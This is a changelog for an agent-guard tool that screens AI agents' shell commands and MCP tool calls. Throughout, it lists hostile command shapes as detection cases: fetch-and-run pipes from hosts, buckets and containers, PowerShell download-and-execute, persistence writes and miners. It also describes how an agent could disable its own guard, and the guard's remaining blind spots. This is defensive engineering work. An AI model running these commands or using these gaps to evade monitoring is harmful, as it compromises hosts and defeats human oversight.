  `tee -a`, a here-string, or a heredoc into `.bashrc`, `.bash_profile`,
  `.profile`, `.zshrc`, `/etc/profile.d/` and the other startup files) was
  allowed: the written text is literal output, so only the profile write was
  scored. The text is now analysed as the command it becomes at the next
  login, and it scores what running it directly scores, plus the
  persistence. `export PATH=...` and `alias` lines analyse to nothing and
  stay allowed. A line that is itself flagged when run directly is flagged
  when written too.
- **More ways to fetch and run are caught.**
  - `ssh host cat x | bash` and `ssh host cat x > f && sh f`; `aws ssm
    get-parameter`, `aws secretsmanager get-secret-value` and `vault kv get`
    piped to a shell; files fetched by `ftp`, `lftp`, `tftp` or `smbclient`
    (`get`) and by `nc host port > f`, then run.
  - Archives unpacked by `cpio -i`, `rpm2cpio | cpio`, `ar x`, `dpkg -x`,
    `jar xf`, `unrar x` or `cabextract`, then run; `tar --to-command` on a
    fetched archive.
  - A fetched package installed: `pip install ./x.whl`,
    `npm install ./x.tgz`, `dpkg -i x.deb`, `rpm -i x.rpm`,
    `apk add --allow-untrusted x.apk` (install scripts run).
  - PowerShell: `iwr|irm|Invoke-WebRequest|Invoke-RestMethod ... | iex`,
    `iex (iwr ...)`, `DownloadString` with `IEX`, the same inside
    `powershell -c "..."`, and an `-EncodedCommand` that decodes to it
    (denied: a decoder).
  Each scores like the curl form (review, blocked for an agent; denied with
  the same aggravating evidence).
- **Commands written into files that run later are scored as commands.**
  Besides the shell startup files: `~/.bash_logout`, `~/.ssh/rc`, a
  `PROMPT_COMMAND` value, git hooks, a desktop autostart `Exec=` line, a
  systemd unit's `ExecStart=` lines (including a heredoc), `/etc/cron.d`
  files and lines piped or heredoc-fed to `crontab -`. An inert value
  (`PROMPT_COMMAND='history -a'`, an ordinary backup job) is unchanged.
- **A clone that is built or run is recorded, and scored only with
  hostile evidence.** `git clone URL && cd repo && make` (or `./install.sh`,
  `npm install`, `pip install .`) gets a low `clone_and_run` signal and is
  allowed, because developer agents clone and build all day. With no TLS, a
  bare public IP, or a paste or short-link host it scores as a
  download-and-run (deny).
- **Running something from a fetched archive is caught.**
  `curl -LO URL/a.tgz && tar xzf a.tgz && ./a/run`,
  `curl -sL URL | tar xz && cd pkg && ./install.sh`,
  `git archive --remote=R HEAD | tar -x && sh x.sh`, an `aws s3 cp` of a
  zip unpacked with `unzip` and run, and the same through `7z x`, `bsdtar`,
  `python -m zipfile -e`/`tarfile -e`, or `gunzip`/`xz -d` first, were
  allowed: the download never names the file that runs. A fetched or
  remotely read archive unpacked in the same command now marks what it
  wrote (its `-C`/`-d`/`-o` directory, or the working directory), and
  running a path from there scores like the plain download-and-run (review,
  blocked for an agent). Unpacked and only listed or read stays allowed.
- **Code read from an object store, a cluster, a container or another host
  is treated as fetched.** `aws s3 cp s3://b/k - | bash`,
  `source <(aws s3 cp s3://b/k -)`, `gsutil cat`/`gcloud storage cat` piped
  to a shell, `kubectl get ... -o jsonpath=... > r.sh && sh r.sh`,
  `kubectl exec pod -- cat x | bash`, `docker run img cat x | sh`,
  `rclone cat remote:x | bash`, `scp host:/x . && bash x`,
  `rsync -a host:/x ./x && ./x`, `kubectl cp`/`docker cp` then run,
  `az storage blob download --file x && bash x` and
  `git show origin/main:x | bash` were allowed: only HTTP downloaders
  counted as a fetch. They now score like the curl form (review, blocked for
  an agent; deny when sourced or evaluated). A copy that keeps the source's
  mode (`rsync -a`, `scp -p`, `kubectl cp`, `docker cp`) counts as already
  executable. Copies nobody runs, uploads, `kubectl get -o yaml > f`,
  `kubectl exec pod -- ls`, and `kubectl`/`helm completion` stay allowed.
- **A tool's own shell setup line is no longer refused as fetched code.**
  `source <(kubectl completion bash)`, `source <(helm completion bash)`,
  `eval "$(gh completion -s bash)"`, `source <(rustup completions bash)`,
  `eval "$(pyenv init -)"`, `eval "$(direnv hook bash)"` and
  `eval "$(starship init bash)"` were denied, run directly or written into
  `~/.bashrc`: any substitution sourced or evaluated counted as fetched
  code. One installed program printing its setup, in a command that fetches
  nothing, is now allowed. A substitution that fetches, decodes, prints
  code the command wrote itself (`echo`, `printf`, a heredoc, `python -c`),
  runs a file from the working directory or a temp directory, or sits in a
  command that fetches anything is still denied
  (`source <(curl ...)`, `eval "$(curl ... | base64 -d)"`).
- **Running a file after `cd` into a temp directory is seen.**
  `cd /tmp && ./x`, `cd /dev/shm; sh p`, `pushd /var/tmp`, and a `cd` into a
  directory the same command made with `mktemp -d` were allowed: the
  temp-directory check only matched `/tmp/x` written out. The working
  directory the command moves into is now followed, so running a relative
  file from there is flagged like `/tmp/x` (review on its own, and a
  fetch-and-run there is denied). `cd /tmp && ls` or `cat x` runs nothing
  from it and stays allowed. A subshell's `cd` ends with the subshell, so
  `(cd /tmp && ls); ./build.sh` is not flagged, while `(cd /tmp && ./x)` and
  `{ cd /tmp; ./x; }` are.
- **Sourcing a downloaded file with `.` is seen.** `curl -o r.sh URL && .
  ./r.sh` was allowed while `source ./r.sh` was caught.
- **An MCP wrapper whose proxy binary is gone is not reported as guarded.**
  The agent list, the dashboard and `status` judged an MCP agent's wrapper by
  its text, so a config pointing at a removed or moved `innerwarden` read
  "guarded" while every one of its servers failed to start. It now says the
  proxy program does not exist and offers `innerwarden agents connect <name>`
  in the mode the wrappers had. Nothing is unwrapped.

### Project

- The benchmark gate holds the new cases: 245 attacks caught, every command
  attack blocked for an agent, fetch-and-runs after `cd` into a temp
  directory denied, startup-file writes charged for what they write, and 0
  of 160 ordinary commands flagged
  (including unparseable ones that only fetch or only run, `npx`/`uvx` runs
  of real packages, downloads through aria2c, axel and lwp-download that are
  not run, network one-liners that only print or save data, and `cd /tmp`
  followed by commands that run nothing from it).
- The OWASP Agentic map (`crates/agent-guard/OWASP-AGENTIC-TOP-10.md`) no
  longer says every download-and-execute and temp-dir executable is denied.
  Its ASI05 row now says what the benchmark measures: a plain fetch-and-run
  over TLS from a named host is review and blocked for an agent; no TLS, a
  bare IP, a paste or short-link host, a decoder, or fetched bytes reaching
  an interpreter by substitution, `eval` or a nested shell is deny; reverse
  shells are deny; an obfuscated payload is review and blocked for an agent;
  a temp-dir executable alone is review and not blocked for an agent. It
  also says the guard judges one command at a time, and that a clone built
  in the same command is allowed unless its source is hostile.
- The same map's other rows now say only what the code does: ASI01 counts
  27 prompt-injection patterns (it said 24) and says an injected tool result
  is a review alert, not blocked; ASI02 says non-blocking dangerous-command
  patterns are review, not deny; ASI03 names the credential signals
  Community actually emits (it listed `credential_access`, which no rule
  emits, and Active Defence's privilege-provenance signals as Community's);
  ASI10 states the measured split (destruction, tampering, miners and
  reverse shells deny; scheduled tasks and services review and blocked for
  an agent; a shell-profile write alone allowed).
- The release job fails when the `guard-vX.Y.Z` source tag is missing or
  names a different commit than the one it built.
- A test pins that the `.deb` and `.rpm` ship `/usr/bin/innerwarden` and no
  `iw` shortcut (`iw` is the Linux wireless tool's name).
- The coverage job reads its configuration again (the engine name is
  case-sensitive, so the 75% floor and the excludes were silently ignored)
  and fails if the configuration is ever rejected.
- Every dashboard journey test runs at a fixed clock, so the suite no longer
  breaks when the calendar moves past its fixtures.
- The CLI's tests are no longer answered by an `innerwarden-ctl` installed on
  the machine running them.

## 1.5.2 - 2026-10-07

### Upgrade notes: what to do

- **OpenClaw message hook: install it again, this once.**
  `innerwarden observe install`, then restart the OpenClaw gateway. The hook
  an earlier version wrote keeps running after an upgrade, and with it
  Control UI chats are recorded only after 15 minutes and without the agent's
  name. The install now also adds the reply plugin (below), and grants it the
  conversation access OpenClaw requires before a plugin can read a turn; it
  says so, and leaves alone an entry you turned off and your `plugins.allow`,
  `plugins.deny` and `plugins.enabled`. From this version on, `upgrade` brings
  the hook and the plugin up to the new version's itself (`observe refresh`).
  `innerwarden observe status` and the dashboard's Messages card say when
  either is an earlier version's, or is not what InnerWarden wrote.
- **A copy installed from the `.deb` or `.rpm` is upgraded with the package.**
  `innerwarden upgrade` refuses it and exits 2, so an unattended
  `sudo innerwarden upgrade` on such a host now fails. Use the command it
  prints (it fetches the package and its checksum into a private directory,
  checks it, then installs it), or `--yes` to replace the file anyway.
  `upgrade --check` reports on every kind of install.
- **`innerwarden uninstall` on a packaged copy** removes the hooks, the
  configuration and the `iw` / `iw-guard` shortcuts, leaves the binary to
  `sudo apt remove innerwarden` or `sudo dnf remove innerwarden`, and exits 1
  with "partly removed" until that is done.
- **`innerwarden uninstall` removes only the installer's copy.** A binary
  the installer did not lay down (installed with `cargo install`, with Scoop,
  or a copy another program keeps for itself) is now left where it is, with
  the command that removes it where there is one, and the run exits 1 with
  "partly removed". After uninstalling a cargo or Scoop copy, finish with
  `cargo uninstall innerwarden` or `scoop uninstall innerwarden`.
- **Reconnect MCP agents to have them named.** `innerwarden agents connect`
  now writes `--label` and `--agent` into each MCP wrapper, so its decisions
  are recorded under the session `mcp:<agent>` instead of `mcp:innerwarden`.
  Run it again for wrappers an earlier version wrote; history recorded before
  that stays under the old session.

### Changed

- **A Control UI ask is recorded with how the turn ended.** OpenClaw reports
  no reply from its Control UI chat to hooks, so an ask made there was
  recorded after two minutes with the outcome not seen. `observe install`
  now adds an OpenClaw plugin, `innerwarden-replies`, that reads the end of
  each Control UI turn a person started (OpenClaw's typed `agent_end` hook)
  and reports only its shape, a tool call, a reply, or neither, to the new
  `innerwarden observe ended`. That closes the ask whose message started the
  turn, and no other: a turn that replied with no tool call is recorded as
  `undetermined` with `decider_basis: replied_without_tool_call` (the agent
  ran nothing; the plugin never reads the words, so whether it declined is
  not seen); one that called a tool is `undetermined`, `tool_call_in_turn`,
  because a tool the guard does not screen leaves nothing in its record, and
  a reply after it does not show the agent declined; one that ended with
  nothing said is `undetermined`, `turn_ended_without_reply`. A heartbeat or
  cron turn never closes an ask. A turn holding a message in a shape the
  plugin does not know is not reported, unless a tool call it recognises
  makes it `tool_call_in_turn`, and the ask is recorded as not seen. Where
  the plugin runs, the message hook's two-minute timer leaves an ask to the
  end of its turn (at most 15 minutes), so a long turn is not recorded as
  "this chat does not report your agent's reply", and what the guard
  recorded late in it is in the record. The plugin reads Control UI turns
  only.
  The gateway logs the plugin as one it cannot verify, because it was not
  installed through `openclaw plugins install`.
- **A reply is no longer read as the model declining.** `observe reply`
  recorded a reply with nothing the guard screens in its window as
  `model_refused`, and the dashboard said "Your agent declined on its own".
  The reply's words are never read, and a tool the guard does not screen
  (OpenClaw's own exec) leaves nothing in its record, so an ask the agent
  carried out with such a tool, or answered by doing what was asked in
  words, read the same. Such a reply is now `undetermined`, with
  `decider_basis: no_screened_execution_recorded_in_window`, and the
  dashboard says the agent replied and nothing the guard screens ran, under
  the outcome "Answered". Records an earlier version wrote that way read the
  same. `model_refused` is written only when a caller states it
  (`observe reply --decider`).
- **`upgrade` refreshes what `observe install` wrote.** After the binary is
  replaced, the new binary's `innerwarden observe refresh` replaces the
  message hook's and the reply plugin's files with the new version's where
  they are exactly what an earlier release wrote. A file somebody changed is
  left as it is and named, nothing that was not installed is added, and the
  gateway is never restarted: the upgrade says to restart it.
- **The MCP proxy ends with its session.** When the client closes, the proxy
  relays the server's last output for 3 s, then stops the server: SIGTERM to
  its whole process group, SIGKILL 1 s later, so a server started through
  `npx`, `uvx` or `sh -c` is stopped with its launcher.
- **The MCP loop breaker holds one call for one window.** An identical tool
  call made more than 3 times within 60 s is refused (guard) or flagged
  (advisory), that call only, and the refusal says when it is accepted again.
  The cost ceiling is gone. Library users: `innerwarden_agent_guard::breaker`'s
  `BreakerConfig` and `Breaker::record` changed.
- **Conversation records claim less, and say why.** `guard_denied` is recorded
  only for an observed reply and an enforce-mode refusal on a line naming the
  agent that was asked and the session the ask arrived in. A refusal of the
  same agent in another conversation, or under the MCP proxy's own session
  (how OpenClaw is guarded), is recorded as `undetermined` with
  `decider_basis: guard_block_recorded_in_window`; it used to stamp whatever
  ask was waiting `guard_denied`, `enforced: true`. A monitor-mode
  `would_block` in the window is recorded as `undetermined` with
  `decider_basis: flagged_action_ran_in_window`, never as a refusal or as the
  model declining. `guard.attempt` gains `agent` and
  the bases `next_message_before_reply`, `channel_reports_no_reply`,
  `pending_limit_reached`, `pending_state_unavailable` and
  `flagged_action_ran_in_window`; `guard.blocked` gains `agent`.
- **A guard event file that cannot be written is an outage.** A link, a second
  name, something that is not a plain file, or a file this account cannot
  append to, at `guard-events.jsonl` or `record-health.json`, is reported by
  `innerwarden graph` and the dashboard with the fix, instead of dropping lines
  silently.

### Fixed

- **`uninstall` no longer deletes a copy it did not install.** It decided
  from npm, the `.deb`/`.rpm` database and whether the file could be deleted,
  and as root every file can be, so `sudo innerwarden uninstall` run from a
  copy another program keeps for itself deleted it. The binary is now removed
  only when it is the installer's: named `innerwarden`, `iw` or `iw-guard`,
  and either in the installer's directory for this account (`~/.local/bin`,
  or `%LOCALAPPDATA%\Programs\InnerWarden` on Windows) or with an `iw` or
  `iw-guard` beside it that links to it or is a copy of it. Anything else is
  kept and named, and the hooks and configuration are still removed.
- **`uninstall --dry-run` writes nothing.** The preview found out whether the
  binary could be deleted by creating and deleting a file beside it. Both the
  preview and the run now read that from the file system's own permission
  check, without writing.
- **`upgrade` refreshes the installer's `iw` and `iw-guard` copies.** Where
  the shell installer cannot make a link it copies the binary instead, and on
  Linux and macOS `upgrade` replaced only `innerwarden`, so `iw` went on
  running the build first installed, and `uninstall` then kept both copies as
  another program's. A copy is now replaced with the binary when it is this
  build or any earlier one (recognised by the release key every build since
  1.1.0 carries, without running it), and `uninstall` removes such a copy. A
  link is left a link, and a file that is not InnerWarden is not touched.
- **`upgrade` never writes through a link at its staging name.** The new
  binary is staged beside the old one, and a link planted under that name, in
  a directory another account can write, made `sudo innerwarden upgrade` write
  the release (and its first check, an empty file) over whatever the link
  pointed at. Whatever is at the staging name is now removed first and the
  file is created afresh.
- **Removing one agent's hook no longer prints `rm <path>`.** `innerwarden
  uninstall <agent>` ended by handing out a bare `rm` of whatever copy was
  running, an npm or package copy included. It now points at the full
  `innerwarden uninstall`, which decides whether the binary is its to remove.
- **A question about a miner is not an attack attempt.** The command rules
  refuse a miner binary wherever its name appears, so a message such as "how
  do I remove xmrig from this box?" was recorded as a conversation attempt,
  deny 40. A name that is only talked about is now taken out before the rules
  read the message: a plain word the sentence acts on right before it
  ("remove xmrig", "kill the xmrig process", "we found minerd") or asks about
  in the clause that holds it ("how do I remove xmrig", "is xmrig running"),
  and `t-rex` unless the message is about mining. A message that asks for
  anything, gives the miner as a command (`nohup xmrig`, `xmrig -o ...`), or
  has a defence word only elsewhere in the sentence ("configure xmrig and
  monitor the hashrate") is read as before. What is no longer recorded: a
  request with no request verb, phrased as a question about the miner ("what
  if xmrig ran on every core?") or with a defence or report word right
  before its name ("now that we found xmrig, keep it going"). The command
  such an ask leads to is still screened: a miner in a command an agent runs
  is still refused.
- **A held lock no longer holds back the hook's verdict.** The hook records
  each decision before it answers, and one of the locks that write takes was
  waited for with no time limit, so any account able to open that lock (the
  guarded agent's own included) could keep the hook from answering at all.
  Every lock the record takes is now waited for at most 100 ms: the verdict is
  returned as normal, and the skipped record is reported as a recording
  outage, `graph_lock_timeout`. Agent configuration writes give up after 2 s
  and say which lock was held, and so does the agent-policy lock
  (`~/.config/innerwarden/agents.lock`) after 5 s: `enforce`, `dry-run`,
  `agents connect` and `disconnect`, `setup`, `upgrade`'s rewiring and the
  dashboard's auto-connect all take it first, and a holder that never let go
  kept each of them waiting for good. `innerwarden observe` gives up after 1 s, and
  an ask it could not hold is recorded at once with its outcome unknown.
- **One large tool result no longer clears what the MCP proxy remembers.**
  The proxy keeps the long values of each tool result so that a later call
  carrying one is flagged (`AG-TAINT`). A single large result, such as an
  image read or a file of many short words, used to push out every value kept
  before it. The newest results are now kept whole; each older one keeps a
  sample of up to 4 KiB, its network destinations (URLs, e-mail addresses,
  `host:port`) first, then the rest drawn by a key chosen per proxy; a value
  over 256 bytes is kept by its start, which still matches a call that
  carries all of it. The store stays bounded, at about 1.1 MiB per proxy.
  What a result's author still decides is how much of their own result
  competes for its share: once the store is full, the next maximal result
  the agent reads cuts a result to its share, and a page padded with other
  destinations keeps only some of them. A value is found by its hash, so a
  session that lists thousands of names under one directory no longer slows
  every message the proxy relays; the search of one call is bounded, and a
  call whose arguments cannot be checked in that bound is refused
  (`AG-TAINT`) rather than passed unchecked.
- **Each MCP proxy uses about half the memory.** A proxy compiled every rule
  in the shipped corpus as it started, about 47 MB before it had screened a
  message, half of it rules for model prompts that a proxy never applies.
  Each rule is now compiled the first time something it applies to is
  screened, before that first verdict is given: a proxy starts at about 6 MB
  and, once tool calls and results have passed through it, holds about 25 MB
  where it held about 52 MB (Linux x86_64). The verdicts are unchanged.
- **The MCP proxy no longer refuses every `write_file`.** ATR-2026-040 matched
  the tool's name, so in guard mode (the proxy's default) every write through
  a filesystem server was refused, an ordinary one inside its allowed
  directories included, while the same server's `edit_file` and `move_file`
  were not checked at all. The rule no longer looks at the name. A tool call
  that may change a file granting privilege or a login, holding code that
  runs as root, or carrying the guard itself, is refused instead
  (`AG-PRIV-WRITE`), whichever tool makes it and however the path is spelled
  (`/etc//sudoers`, `/tmp/../etc/cron.d/x`, `/private/etc/...`, `file://`):
  the sudo, doas and polkit rules, PAM, accounts and groups, SSH keys and
  server settings, root's home, the dynamic linker's preload list, system
  cron jobs and logrotate, boot services and systemd's defaults, the login
  scripts every account runs (`/etc/profile`, `/etc/profile.d`,
  `/etc/bash.bashrc`, `/etc/environment`, ...), network dispatcher scripts,
  udev and kernel module rules, kernel settings (`/etc/sysctl.d`), the
  package manager's hooks and install scripts, the system's programs and
  libraries, and the guard's own wiring: the agent settings that carry its
  hook (`.claude/settings.json`), every MCP configuration it wraps
  (`.claude.json`, a project's `.mcp.json`, `.cursor/mcp.json`,
  `.codex/config.toml`, `.gemini/settings.json`, `openclaw.json`), the
  OpenClaw hook and plugin `observe install` lays down, and its own
  configuration (`~/.config/innerwarden`, `/etc/innerwarden`,
  `/var/lib/innerwarden`). Only a path where the call writes (an argument
  such as `path`, `source`, `destination`, `file`) is judged against every
  one of these; a single path anywhere else (an argv entry, an unusual
  argument name) is judged against all but the system's programs, and a
  sentence, a search query or a command line is not taken for a target. The
  filesystem server's read-only tools, and any tool its server declares
  read-only (`readOnlyHint`), may name these files. What is left open: a
  write tool whose target argument has an unusual name is not held to the
  system's programs; a relative path (and `~/`) is held only to what is the
  same in every directory (`.ssh`, the agent settings), so `etc/sudoers.d/x`
  sent to a server working in `/` is not judged; Windows paths are not
  judged; links are not followed; and the configuration of another program
  that runs as root (a web server's, a container runtime's) is left to the
  other rules.
- **`innerwarden agents` and `status` report the mode each MCP proxy runs in.**
  The mode was guessed by searching the agent's configuration for the words
  `advisory`, `warn`, `guard` and `kill` anywhere in it, so a log level or a
  server's own argument could decide it, and a wrapper set to
  `--mode=advisory` beside any other `"guard"` was listed as enforce while it
  only recorded. Each wrapper's arguments are now read the way the proxy reads
  them, the way the dashboard already did, and a flag's value is never taken
  for the mode (`--label --mode=guard` is a label). A wrapper whose last
  option before `--` is a flag waiting for its value is listed as not guarded:
  the proxy takes that `--` as the value and runs the options written after
  it. A wrapper whose proxy refuses one of its words (`--verbose`) exits
  before its server starts, and is listed as not guarded. Only a command
  named `innerwarden`, `iw` or `iw-guard` is taken for the guard: any name
  that began with `innerwarden` counted, so a script under such a name was
  listed as the guard in enforce mode while it ran the server unscreened.
  Such a server is now listed as not guarded, and connecting the agent wraps
  it in the real proxy. The configuration is read, not the binary: a program
  written under one of the guard's own names is still taken for it. A
  generic MCP client now shows the mode of its own configuration: it showed
  none, and one kept in `~/.claude/` showed Claude Code's.
- **A loop-breaker finding names the risks a loop is.** `AG-ASI09-BREAKER`
  carried no OWASP Agentic class, so its case read "OWASP Agentic: none",
  and its id points at ASI09, human-agent trust exploitation, which a loop is
  not. It now names ASI02 (tool misuse and exploitation) and ASI08
  (cascading failures) in its record and on its case. The id is unchanged,
  so an alert rule written against it keeps matching.

## 1.5.1 - 2026-09-30

### Fixed

- **A hook whose binary is gone is no longer "on".** `status`, `agents` and the
  dashboard now say so, name the missing path and the `innerwarden install`
  that fixes it. A week-old record no longer proves commands reach the guard,
  and auto-connect logs a change once, not every minute.
- **Auto-connect never writes a hook naming a binary that is gone.** After an
  in-place upgrade on Linux, or once a build is cleaned, the dashboard's
  background setup could point a hook at a path that no longer runs. It now
  writes nothing and says once that the dashboard needs a restart.

## 1.5.0 - 2026-09-30

### Added

- **A dashboard you can read at a glance.** `innerwarden dashboard` now opens
  on five pages in the same design as the full product: Overview (what your
  agents did, messages sent to your agent, and what this machine does not
  watch), Protection (what Community covers here, with what it refused for
  you since the guard's log began), Cases, Agents and Tokens.
- **Cases.** Every command or tool call the guard flagged is a case with three
  answers: what happened, what InnerWarden did (seen, decided, enforced,
  verified), and what you can do, as the exact `innerwarden` command. Runs of
  one reason fold into one line; filters and links live in the address.
- **An honest path to Active Defence.** At most one offer per page, tied to
  the case on screen, dismissible, never a lock or a blur. Where Active
  Defence is installed, the offer is one line saying so.

### Changed

- **Destroying the host's audit trail is HIGH**, not MEDIUM, and a denied
  secret read is no longer MEDIUM.
- **Counts say what they count.** One timestamp format, one count per
  session on every screen, and a partial read says "at least N".

### Fixed

- **rustls 0.23.45** closes RUSTSEC-2026-0285.
- **The vendored ATR rules carry their MIT notice.**

## 1.4.9 - 2026-09-08

### Fixed

- **Windows: `innerwarden upgrade` now replaces the running binary.** It
  renamed the new file over the running `innerwarden.exe`, which Windows
  refuses (`Access is denied`), and then advised `sudo innerwarden upgrade`.
  The running image is now parked beside itself, the new one lands in its
  place, and the installer's `iw.exe` / `iw-guard.exe` copies are refreshed
  too. The advice on Windows names the real causes: another InnerWarden
  process, or a folder that needs an elevated PowerShell.

## 1.4.8 - 2026-09-08

### Fixed

- **The hook no longer lets a tool call it cannot read pass in silence.** Fed an
  empty stdin, non-JSON, or a shell tool call with no command string, the hook
  exited 0 and said nothing, so a payload shape it did not understand (an agent
  update, an encoding problem) would have let every command run unscreened. In
  enforce it now refuses such a call (exit 2, reason on stderr); in monitor it
  says the call was not screened (exit 1). Well-formed calls for tools that
  carry no command (Read, Edit) still pass untouched.

## 1.4.7 - 2026-09-08

### Fixed

- **Windows: the binary now starts on a stock machine.** `innerwarden.exe`
  imported `vcruntime140.dll`, which a fresh Windows without the Visual C++
  redistributable does not have; the installer said "Done" and the first
  command died with `STATUS_DLL_NOT_FOUND`. The C runtime is now linked in
  (`+crt-static`) and the release build fails if the exe still imports it.
- **Windows: the install command names `www.innerwarden.com`.** Windows
  PowerShell 5.1 does not follow the apex's 308 redirect; PowerShell 7 does,
  which is why the runners never saw it.

## 1.4.6 - 2026-09-08

Two things a new user meets in the first hour on a stock Ubuntu 24.04 host,
found by installing the way the site says to and running each command in
`--help`.

### Fixed

- **`innerwarden contain` on Ubuntu 24.04.** The jail died with
  `bwrap: setting up uid map: Permission denied`. The kernel there restricts
  unprivileged user namespaces (`kernel.apparmor_restrict_unprivileged_userns`)
  and the image ships no AppArmor profile for `bwrap`. `contain` now checks
  both before building the jail and, when it cannot, prints the profile that
  grants `bwrap` a user namespace and the `apparmor_parser` line to load it,
  then runs nothing. The sysctl stays as it was.
- **`innerwarden upgrade` on an up-to-date host** fetched the published
  binary, replaced identical bytes and reported "Upgrade complete". It now
  reads the manifest first and stops with "Already on the latest build", as
  `upgrade --check` already did. `--yes` still replaces the file.

## 1.4.5 - 2026-08-30

We ran the product the way a bank's security team would: 764 realistic commands,
built as nine independent batches and deliberately mixed. 310 that must be
refused, 357 that must run, 97 judgement calls. The benign half is the larger one
on purpose, because a guard that blocks real work gets switched off in week two.

                       before    after
    attacks blocked     48.7%    75.2%
    attacks caught      51.0%    78.7%
    ordinary work       96.6%    98.6%
    hard false positives    7        0

### Added

- **The guard now has a memory.** A value that arrives in a tool result and
  reappears as an argument later is the attack a stateless screener cannot see,
  because the second command is not wrong; its origin is. A `PostToolUse` hook
  carries results in, the session remembers what they contained for 30 minutes,
  and a command carrying one is held for review with the value and the source
  tool named. It never lowers a verdict: a command already refused stays refused.

  `innerwarden upgrade` now reconciles the hooks it wrote, so an existing
  install gets the observation half rather than a build that has the defence and
  a configuration that never invokes it.

- Detection for seven families that previously scored zero: cloud control-plane
  actions (audit trail, threat detection, IAM grants, public buckets, key
  deletion), data destruction, anti-forensics, persistence installs, Kubernetes
  escapes, untrusted software sources, and local credential stores and kernel
  hardening knobs. Every family ships its ordinary neighbours as pinned
  negatives, so `terraform plan`, `kubectl get`, `crontab -l`, `chmod 755` and
  `journalctl -u` stay untouched.

- Certificate verification being switched off is now visible: `--trusted-host`,
  `GIT_SSL_NO_VERIFY`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `curl -k` and the rest.

### Fixed

- **An agent could switch its own guard off.** A wildcard force-allow,
  `dry-run`, `mute`, and deleting or rewriting the hook configuration all
  returned `allow` at risk 0, while the loud routes were already refused.
  Confirmed by effect: with a wildcard allow in place the hook returned exit 0
  for a command it refuses a second earlier. Every quiet route now denies, and
  reading the configuration still does not.

- Twelve false positives, collapsing into four rules. `eval "$(...)"` alone was
  four of them and fires on `kubectl completion`, `direnv hook` and
  `ssh-agent -s`. Also IMDSv2's token handshake, which is the hardened path AWS
  tells people to use; `shred` of a runtime token, where refusing teaches people
  to leave it on disk; `/etc/ssl/certs/*.pem`, which is public by definition;
  and `.env.example`, which is a committed template.

### Performance

- The hook is a one-shot process, so every tool call pays to compile whatever
  regexes it touches. A literal gate now decides each family before a single
  regex is built, and normalization is lazy. Measured over 40 invocations
  against 1.4.4: **5.45s to 4.00s**, with detection unchanged.

## 1.4.4 - 2026-08-30

The dashboard opened with five counters and left the arithmetic to the reader,
and the graph behind it was quietly losing most of what it recorded.

### Fixed

- **The graph dropped 88% of the record.** `drop_oldest` selects the oldest
  nodes, a session anchor is always older than every command under it, so the
  first prune to reach the anchor removed it and `retain` then removed every
  `ran` edge that pointed at it. The commands were still stored and nothing
  could reach them. Pruning now keeps session anchors, `cases_page` recovers
  commands whose edge is gone by their `cmd:{session}:` prefix, and a session
  whose anchor was pruned is rebuilt from the ids that survive.

  Measured on one real store before and after: activity total 1,951 to 15,707,
  sessions 4 to 6, and the needs-review filter 6 to 136. Nothing new was
  recorded; that is all record that was already on disk and unreachable.

- **The screen did not answer the question people open it with.** A new
  headline computes the conclusion instead of printing counters: whether
  anything needs the reader, and what to do about it. Monitor mode is reported
  as the choice it is rather than as a failure, because calling it a fault
  pushes people to enforce before they are ready.

- **Evidence moved behind a switch instead of shouting.** "Configured, not
  verified", "Authority unknown", "Partial evidence" and the rest were each
  true and together read as a product that does not know what it is doing. They
  now live behind **Show technical detail**, off by default and persisted. The
  line that is not crossed: a good state may hide its provenance, a bad one may
  never hide its existence. Queued work, failures and hosts needing attention
  stay visible in both registers, and there is a test that refuses "Protected"
  while anything is queued.

- **A session was headlined by its own UUID.** The list read as four
  indistinguishable hex strings, one of which was the session the reader was
  sitting in. The heading is now the time range the run covers; the id stays on
  the card for correlating with a log.

- Hidden technical markup is not mounted rather than hidden with CSS, and
  nothing extra is fetched for the technical register, so the switch costs
  nothing while it is off.

## 1.4.3 - 2026-08-24

Three things the product said that were not true, all found by walking a real
install on a clean machine. None of them let an attack through; all three cost a
new user their first ten minutes, which for a security tool is worse.

### Fixed

- `innerwarden uninstall` said "removed" over a machine it had half-uninstalled.
  Without root against an npm install it destroyed the hook, the config
  directory and the API key first, then failed to unlink the binary, then
  printed a success line and exited 0. The next `innerwarden` call answered
  "linux-x64 IS supported, but its binary is not installed", so the product
  reported itself broken one command after reporting success.

  The remedy it offered was wrong twice: `rm <path>` needs exactly the root the
  run had just proven it did not have, and on an npm copy it is the move this
  crate already documents as wrong, because npm owns the `innerwarden` and `iw`
  launchers too. `upgrade` has consulted `managed_by` before acting since 1.4.0;
  `uninstall` never did.

  It now decides before it destroys. An npm-managed copy is left to
  `npm uninstall -g innerwarden`, which removes the binary, both launchers and
  npm's record of them. A direct install that cannot be written to says so up
  front, while the machine is still intact. Anything left behind is reported as
  left behind and exits non-zero. `--dry-run` previews the same decision, rather
  than listing a path the real run must not touch.

- The npm launcher's recovery instruction was the command that fails. When the
  platform binary is missing it is read at the exact moment the reader has
  nothing working, and it said `npm uninstall -g innerwarden && npm install -g
  innerwarden`. On a distro-packaged Node, npm's global prefix is
  `/usr/local/lib/node_modules` and root-owned, so on Linux that exits EACCES.
  It now leads with the installer that needs no root, per platform, and still
  offers npm with the sudo requirement stated.

  The test covering that message asserted it contained
  `npm install -g innerwarden`, which is a substring of the very command being
  handed out. It passed before the fix and would have passed after it, either
  way. It has been replaced rather than added to.

- `innerwarden -v` answered "unknown command `-v`" and then printed the whole
  help. `--version`, `-V` and `version` all worked; the one short form people
  actually type was the one missing, and the failure path buried its own reason
  under 61 lines of usage that wrap to 88 on an 80-column terminal. `-v` now
  answers, and an unrecognised token gets its reason plus a pointer to `--help`
  instead of the manual. `--help` itself is unchanged.

## 1.4.2 - 2026-08-24

Setting up Telegram alerts is now something the wizard does, rather than
something it asks you to go and do elsewhere.

### Fixed

- The setup wizard lost the answer to its own question. Answering **yes** to
  "Get notified when a command is flagged?" led to a channel picker where
  pressing ENTER selected nothing, and the wizard accepted the empty result,
  printed a note that read like an optional aside, and moved on. Nothing was
  written to disk. Someone who asked to be notified was not notified and was
  never told.

  Telegram now starts ticked, so ENTER alone does the obvious thing. An empty
  selection is explained once (SPACE toggles) and asked again. If nothing is
  chosen the wizard says **alerts are OFF** instead of implying success, and the
  same applies when a channel is picked but left blank. Both recovery lines now
  name the Telegram flags rather than suggesting a Slack webhook regardless of
  what was asked for.

### Added

- The wizard fetches your Telegram chat id instead of demanding it. It used to
  say "then get your chat id" and offer no way to get one, so finishing meant
  leaving the wizard to call the Telegram API and read JSON by hand. It now asks
